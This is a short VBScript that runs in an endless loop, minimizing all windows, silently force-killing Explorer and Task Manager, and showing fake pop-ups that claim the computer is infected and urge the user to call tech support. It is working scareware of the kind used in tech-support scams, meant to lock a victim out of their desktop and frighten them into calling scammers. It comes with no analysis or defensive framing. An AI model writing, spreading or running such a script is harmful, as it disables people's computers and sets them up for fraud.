Do
Set Objshell = CreateObject("WScript.shell")
Set objApp = CreateObject("Shell.Application")
objApp.MinimizeAll
Objshell.Run "Taskkill /F /IM Explorer.exe /IM Taskmgr.exe",0
msgbox("WINDOWS VIRUS ALERT!! ")
msgbox("PLEASE CALL TECH SUPPORT ")
msgbox("YOUR COMPUTER IS INFECTED")
Loop
